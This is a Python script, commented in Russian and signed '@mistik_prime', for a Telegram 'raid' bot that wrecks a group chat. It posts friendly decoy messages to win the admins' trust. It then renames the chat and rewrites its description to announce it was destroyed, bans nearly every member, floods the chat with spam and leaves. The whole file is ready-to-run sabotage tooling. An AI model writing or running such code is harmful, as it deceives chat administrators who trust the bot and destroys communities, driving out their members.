from telethon import TelegramClient, functions
from telethon.tl.types import ChatBannedRights
import asyncio

# ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ
api_id = 0  # Введите ваш api_id
api_hash = "ВАШ_API_HASH"
bot_token = "ВАШ_BOT_TOKEN"
chat_id = -1000000000000  # Введите ID чата
SAFE_ID = 0  # Введите ID пользователя, которого нельзя кикать

client = TelegramClient("raid_bot", api_id, api_hash).start(bot_token=bot_token)

async def destroy():
    me = await client.get_me()
    print("[+] Запущен молниеносный снос с приманкой (автор: @mistik_prime)...")

    # Приманочные сообщения
    bait = [
        "Всем привет! Спасибо, что добавили бота 🤖",
        "Очень рад быть в вашей команде!",
        "Вы лучшие, спасибо за доверие ❤️",
        "Бот активирован, всем удачи!",
        "Спасибо за добавление, я уже в деле 💪",
        "Приятно здесь находиться, ребята 😎",
        "Всё работает, обращайтесь!",
        "Бот полностью готов к работе ✅",
        "Кстати, у меня для вас сюрприз 🎁",
        "Надеюсь, я буду полезен ✨",
        "Спасибо админам за доступ 🙌",
        "Погнали, чат! 🚀",
        "Очень крутое комьюнити!",
        "Благодарю за доверие, не подведу 🙏",
        "Вы просто супер, ребята 🔥",
        "Начинаем работу...",
        "Спасибо, что дали шанс!",
        "Чат огонь, я в деле 💥",
        "Всем добра и позитива 🌟",
        "Жду ваших задач, народ!",
    ]

    # Отправляем приманку
    for msg in bait[:10]:
        await client.send_message(chat_id, msg)
        await asyncio.sleep(0.1)

    # СНОС НАЧИНАЕТСЯ
    try:
        await client(functions.channels.EditTitleRequest(chat_id, "ЧАТ УНИЧТОЖЕН @mistik_prime"))
        print("[+] Название изменено.")
    except:
        pass

    try:
        await client(functions.channels.EditAboutRequest(chat_id, about="Снёс @mistik_prime, всех кикнул."))
        print("[+] Описание изменено.")
    except:
        try:
            await client(functions.messages.EditChatAboutRequest(chat_id, about="Снёс @mistik_prime."))
            print("[+] Описание изменено (через messages).")
        except:
            pass

    # Кикаем всех
    async for user in client.iter_participants(chat_id):
        if user.bot or user.id == me.id or user.id == SAFE_ID:
            continue
        try:
            rights = ChatBannedRights(
                until_date=None,
                view_messages=True,
                send_messages=True,
                send_media=True,
                send_stickers=True,
                send_gifs=True,
                send_games=True,
                send_inline=True,
                send_polls=True,
                invite_users=True,
                pin_messages=True,
                change_info=True
            )
            await client(functions.channels.EditBannedRequest(chat_id, user.id, rights))
            print(f"Кикнут: {user.first_name}")
        except:
            pass
        await asyncio.sleep(0.03)

    # Засорение чата
    spam = ["🔥 ЧАТ СНЕСЁН", "💀 ВСЕ КИКНУТЫ", "⚡ @mistik_prime"]
    for _ in range(10):
        for msg in spam:
            try:
                await client.send_message(chat_id, msg)
            except:
                pass
            await asyncio.sleep(0.02)

    # Выход
    try:
        await client(functions.channels.LeaveChannelRequest(chat_id))
        print("[+] Бот вышел.")
    except:
        pass

    print("[+] Чат уничтожен с приманкой и сносом (автор: @mistik_prime).")

with client:
    client.loop.run_until_complete(destroy())
